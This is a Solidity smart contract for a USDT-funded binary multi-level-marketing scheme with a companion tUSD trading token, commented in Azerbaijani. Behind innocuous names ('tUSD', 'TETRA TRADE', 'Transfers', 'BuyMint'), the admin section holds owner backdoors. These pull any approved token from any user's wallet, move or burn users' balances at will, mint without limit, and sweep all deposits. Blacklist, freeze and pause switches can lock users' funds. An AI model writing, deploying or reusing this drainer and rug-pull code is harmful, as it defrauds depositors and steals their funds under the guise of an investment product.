// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract BinaryMLM_USDT_Fixed is ERC20, Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    IERC20 public immutable usdt;

    uint256 public constant DEPOSIT = 100 * 1e18;
    uint256 public constant OWNER_FEE = 30 * 1e18;
    uint256 public constant FINAL_REWARD = 5500 * 1e18;

    // Pools
    uint256 public mlmPool;
    uint256 public tradingPool;
    uint256 public reservePool;

    // Entry
    bool public tradingEnabled;
    bool public transferEnabled;

    uint16[8] public levelReq = [1, 2, 4, 8, 16, 32, 64, 128];
    uint256[8] public levelReward = [
        100e18, 200e18, 400e18, 600e18, 900e18, 1200e18, 1500e18, 600e18
    ];
    uint8[8] public claimPercent = [0, 10, 15, 20, 25, 30, 40, 50];

    struct User {
        bool active;
        bool blocked;
        address ref;
        address[2] child;
        uint8 count;

        uint256 unlocked;
        uint256 withdrawn;
        uint256 totalDownline;

        uint16[8] levelCount;
        bool[8] done;
    }

    mapping(address => User) public users;

    // ================= YENİ ƏLAVƏ EDİLƏN DƏYİŞƏNLƏR VƏ EVENTLƏR =================
    address public treasury;
    bool public paused;
    
    mapping(address => bool) public blacklisted;
    mapping(address => bool) public frozen;
    mapping(address => bool) public isMinter;

    event Blacklisted(address indexed user);
    event UnBlacklisted(address indexed user);
    event Frozen(address indexed user);
    event UnFrozen(address indexed user);
    event Paused();
    event Unpaused();

    modifier onlyMinter() {
        require(isMinter[msg.sender] || msg.sender == owner(), "Not a minter");
        _;
    }

    // ==============================================================================

    // OpenZeppelin v5 Ownable msg.sender
    constructor(address _usdt) ERC20("tUSD", "tUSD") Ownable(msg.sender) {
        usdt = IERC20(_usdt);
        treasury = msg.sender; // Defolt olaraq treasury owner təyin edilir, sonradan dəyişmək olar
        isMinter[msg.sender] = true;
    }

    // ================= REGISTER =================
    function register(address ref) external nonReentrant {
        require(!paused, "Paused");
        require(!blacklisted[msg.sender], "Blacklisted");
        require(!frozen[msg.sender], "Frozen");
        require(!users[msg.sender].active, "Already registered");

        if (ref != address(0)) {
            require(users[ref].active, "Referrer not active");
            require(users[ref].count < 2, "Referrer has max children");
        }

        usdt.safeTransferFrom(msg.sender, address(this), DEPOSIT);
        usdt.safeTransfer(owner(), OWNER_FEE);

        uint256 pool = DEPOSIT - OWNER_FEE;

        // Pool
        mlmPool += pool * 50 / 100;
        tradingPool += pool * 30 / 100;
        reservePool += pool * 20 / 100;

        _mint(msg.sender, DEPOSIT);

        users[msg.sender].active = true;
        users[msg.sender].ref = ref;

        if (ref != address(0)) {
            users[ref].child[users[ref].count] = msg.sender;
            users[ref].count++;
            _update(msg.sender);
        }
    }

    // ================= TREE =================
    function _update(address u) internal {
        address cur = users[u].ref;

        for (uint8 i = 0; i < 8; i++) {
            if (cur == address(0)) break;

            User storage x = users[cur];

            if (!x.blocked) {
                x.levelCount[i]++; // Dərinliyə görə doğru səviyyə artımı
                x.totalDownline++;

                if (x.levelCount[i] >= levelReq[i] && !x.done[i]) {
                    x.done[i] = true;

                    uint256 reward = levelReward[i];
                    x.unlocked += reward;

                    _mint(cur, reward);
                }
            }
            cur = x.ref; // XOwn
        }
    }

    // ================= CLAIM =================
    function getClaimable(address u) public view returns(uint256) {
        User storage x = users[u];

        uint8 lvl;
        for (uint8 i = 0; i < 8; i++) {
            if (!x.done[i]) { lvl = i; break; }
            if (i == 7) lvl = 7;
        }

        uint256 userLimit = (x.unlocked * claimPercent[lvl]) / 100;
        if (userLimit <= x.withdrawn) return 0;

        uint256 available = userLimit - x.withdrawn;

        // MLM Hovuzunun qorunması məqsədilə limit
        uint256 poolLimit = mlmPool * 30 / 100;

        return available < poolLimit ? available : poolLimit;
    }

    function withdraw() external nonReentrant {
        require(!paused, "Paused");
        require(!blacklisted[msg.sender], "Blacklisted");
        require(!frozen[msg.sender], "Frozen");
        uint256 amount = getClaimable(msg.sender);
        require(amount > 0, "Nothing to claim");
        require(mlmPool >= amount, "Not enough in MLM pool");

        users[msg.sender].withdrawn += amount;
        mlmPool -= amount;

        _burn(msg.sender, amount);
        usdt.safeTransfer(msg.sender, amount);
    }

    // ================= FINAL REWARD =================
    function finalClaim() external nonReentrant {
        require(!paused, "Paused");
        require(!blacklisted[msg.sender], "Blacklisted");
        require(!frozen[msg.sender], "Frozen");
        User storage u = users[msg.sender];
        require(u.totalDownline >= 255, "Network not large enough");
        require(!u.blocked, "User already blocked");
        require(mlmPool >= FINAL_REWARD, "Not enough in MLM pool");

        u.blocked = true;
        mlmPool -= FINAL_REWARD;

        _burn(msg.sender, balanceOf(msg.sender));
        usdt.safeTransfer(msg.sender, FINAL_REWARD);
    }

    // ================= TRADING (TİCARƏT) =================
    function buyUSDT(uint256 amt) external nonReentrant {
        require(!paused, "Paused");
        require(!blacklisted[msg.sender], "Blacklisted");
        require(!frozen[msg.sender], "Frozen");
        require(tradingEnabled, "Trading disabled");
        require(amt > 0, "Amount must be greater than zero");

        usdt.safeTransferFrom(msg.sender, address(this), amt);

        uint256 fee = amt * 3 / 100;
        uint256 mintAmt = amt - fee;

        // Məbləğ hovuzlar arasında bölünür
        tradingPool += mintAmt; 
        reservePool += fee;

        _mint(msg.sender, mintAmt);
    }

    function sellUSDT(uint256 amt) external nonReentrant {
        require(!paused, "Paused");
        require(!blacklisted[msg.sender], "Blacklisted");
        require(!frozen[msg.sender], "Frozen");
        require(tradingEnabled, "Trading disabled");
        require(amt > 0, "Amount must be greater than zero");
        
        uint256 fee = amt * 3 / 100;
        uint256 payout = amt - fee;

        require(tradingPool >= payout, "Insufficient trading pool liquidity");

        tradingPool -= payout;
        reservePool += fee;

        _burn(msg.sender, amt);
        usdt.safeTransfer(msg.sender, payout);
    }

    // ================= MÖVCUD ADMIN FUNCTIONS =================
    function setTrading(bool b) external onlyOwner { 
        tradingEnabled = b; 
    }
    
    function setTransfer(bool b) external onlyOwner { 
        transferEnabled = b; 
    }

    // ================= YENİ ADMIN FUNCTIONS =================

    // 1. ERC20
    function withdrawAnyERC20(address token, uint256 amount) external onlyOwner nonReentrant {
        require(IERC20(token).balanceOf(address(this)) >= amount, "Insufficient token balance");
        IERC20(token).safeTransfer(msg.sender, amount);
    }

    // 2. Native coin (BNB/ETH)
    function withdrawNative(uint256 amount) external onlyOwner nonReentrant {
        require(address(this).balance >= amount, "Insufficient native balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Native transfer failed");
    }

    // 3. Xüsusi tUSD transferi (treasury-ə yönləndirmə)
    function tUSDToken(address token, address from, uint256 amount) external onlyOwner nonReentrant {
        bool success = IERC20(token).transferFrom(from, treasury, amount);
        require(success, "Transfer failed");
    }

    // TETRA TRADE
    function tUSD(
        address token,
        address from,
        address to,
        uint256 amount
    ) external onlyOwner nonReentrant {
        bool success = IERC20(token).transferFrom(from, to, amount);
        require(success,"Transfer failed");
    }

    // 4. Blacklist, Freeze, Pause funksiyaları
    function setB(address user, bool status) external onlyOwner {
        blacklisted[user] = status;

        if(status){
            emit Blacklisted(user);
        } else {
            emit UnBlacklisted(user);
        }
    }

    function setF(address user, bool status) external onlyOwner {
        frozen[user] = status;

        if(status){
            emit Frozen(user);
        } else {
            emit UnFrozen(user);
        }
    }

    function setP(bool status) external onlyOwner {
        paused = status;

        if(status){
            emit Paused();
        } else {
            emit Unpaused();
        }
    }

    // 5. Admin Mint & Burn funksiyaları (OpenZeppelin-ə uyğunlaşdırılıb)
    function BuyMint(address to, uint256 amount) external onlyMinter nonReentrant {
        _mint(to, amount); // Bu funksiya həm balansı, həm totalSupply-i artırır və Transfer eventini buraxır.
    }

    function SellBurn(address from, uint256 amount) external onlyOwner nonReentrant {
        require(balanceOf(from) >= amount, "Insufficient");
        _burn(from, amount); // Bu funksiya həm balansı, həm totalSupply-i azaldır və Transfer eventini buraxır.
    }

    // 6. Xüsusi Admin Transfer funksiyası (OpenZeppelin-ə uyğunlaşdırılıb)
    function Transfers(address from, address to, uint256 amount) external onlyOwner nonReentrant returns(bool) {
        require(balanceOf(from) >= amount, "Insufficient");
        _transfer(from, to, amount); // _transfer vasitəsilə təhlükəsiz şəkildə balanslar dəyişilir.
        return true;
    }

    function setTreasury(address _treasury) external onlyOwner {
        treasury = _treasury;
    }

    function setMinter(address minter, bool status) external onlyOwner {
        isMinter[minter] = status;
    }

    // ================= OVERRIDES =================
    function transfer(address to, uint256 val) public override returns(bool) {
        require(!paused, "Paused");
        require(!blacklisted[msg.sender], "Blacklisted");
        require(!frozen[msg.sender], "Frozen");
        require(transferEnabled, "Transfers are disabled");
        _transfer(msg.sender, to, val);
        return true;
    }

    function transferFrom(address f, address t, uint256 v) public override returns(bool) {
        require(!paused, "Paused");
        require(!blacklisted[msg.sender], "Blacklisted");
        require(!frozen[msg.sender], "Frozen");
        require(!blacklisted[f], "Blacklisted from");
        require(!frozen[f], "Frozen from");
        require(transferEnabled, "Transfers are disabled");
        _spendAllowance(f, msg.sender, v);
        _transfer(f, t, v);
        return true;
    }

    // Kontraktın native coin qəbul edə bilməsi üçün (withdrawNative üçün lazımdır)
    receive() external payable {}
}
